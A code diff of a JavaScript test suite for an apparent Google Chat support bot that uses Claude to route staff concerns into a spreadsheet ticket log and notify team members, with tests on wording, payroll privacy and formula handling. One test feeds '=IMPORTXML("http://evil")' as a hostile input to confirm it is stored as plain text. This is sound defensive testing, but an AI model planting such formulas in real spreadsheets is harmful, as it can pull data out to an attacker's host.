@@ -128,8 +128,8 @@ test('setup creates every tab with headers and seeds routing; running it twice i
 
 test('text that looks like a formula is stored as plain text', () => {
   const env = setupEnv();
-  claudeReturns(env, answer({ escalate: true, category: 'CLIENT_CARE', concern_summary: '=IMPORTXML("http://evil")' }));
-  env.ctx.onMessage(dmEvent('va2@inava.test', 'users/7', 'x'));
+  claudeReturns(env, answer({ escalate: true, category: 'CLIENT_CARE', concern_summary: 'x' }));
+  env.ctx.onMessage(dmEvent('va2@inava.test', 'users/7', '=IMPORTXML("http://evil")'));
   assert.strictEqual(ticketRows(env)[0].Summary, '=IMPORTXML("http://evil")');
   const row = env.sheet('Tickets')[1];
   assert.strictEqual(typeof row[12], 'number', 'Created is stored as a real date');
@@ -230,14 +230,14 @@ test('client care concern opens a ticket and privately notifies Cyn', () => {
     recommended_action: 'Call the client today.' }));
   const r = env.ctx.onMessage(spaceEvent('va2@inava.test', 'users/7', 'spaces/acme', 'My client is unhappy with response times'));
   assert.doesNotMatch(r.text, /INAVA-|ticket/i, 'the VA never sees ticket jargon');
-  assert.match(env.sent.claude[0].body.messages.slice(-1)[0].content, /Team members: CLIENT_CARE: Cyn; OPERATIONS: Mabelle/);
+  assert.match(env.sent.claude[0].body.messages.slice(-1)[0].content, /Team members: CLIENT_CARE: Cyn from our Client Care team; OPERATIONS: Mabelle from our Operations team/);
   const t = ticketRows(env)[0];
   assert.strictEqual(t.Status, 'Assigned');
   assert.strictEqual(t['Assignee Email'], 'cyn@inava.test');
   assert.strictEqual(t['Source Link'], 'https://chat.google.com/room/acme/abc');
   const dm = env.sent.chat.find((c) => c.url.indexOf('spaces/dm-cyn/messages') >= 0);
   assert.ok(dm, 'Cyn was messaged');
-  assert.match(dm.body.text, /^New concern\n\nName: Andy \(Acme VA\)\n\nConcern: Client unhappy with VA response times\.\n\nPriority: High/);
+  assert.match(dm.body.text, /^New concern\n\nName: Andy \(Acme VA\)\n\nConcern: My client is unhappy with response times\n\nPriority: High/);
   assert.match(dm.body.text, /When it's sorted, reply: done INAVA-\d{6}-001$/);
   assert.match(dm.body.text, /chat\.google\.com\/room\/acme\/abc/);
 });
@@ -268,12 +268,12 @@ test('payroll: figures are stripped and only the cleared payroll contact gets de
   const env = setupEnv();
   claudeReturns(env, answer({ escalate: true, category: 'PAYROLL', priority: 'URGENT',
     concern_summary: 'Missing pay of $1,250.00 to account 1234 5678 90.' }));
-  env.ctx.onMessage(dmEvent('va@inava.test', 'users/6', 'I was not paid'));
+  env.ctx.onMessage(dmEvent('va@inava.test', 'users/6', 'I was not paid $1,250.00, my account is 1234 5678 90'));
   const t = ticketRows(env)[0];
   assert.doesNotMatch(t.Summary, /1,250|1234/);
   const dm = env.sent.chat.find((c) => c.url.indexOf('spaces/dm-pay/messages') >= 0);
   assert.ok(dm);
-  assert.match(dm.body.text, /Name: Vicky VA\n\nConcern: Missing pay[\s\S]*Priority: Urgent/);
+  assert.match(dm.body.text, /Name: Vicky VA\n\nConcern: I was not paid \$1,250\.00, my account is 1234 5678 90\n\nPriority: Urgent/);
   assert.ok(!env.sent.chat.some((c) => /dm-mabelle|dm-cyn|dm-verge/.test(c.url)));
 });
 
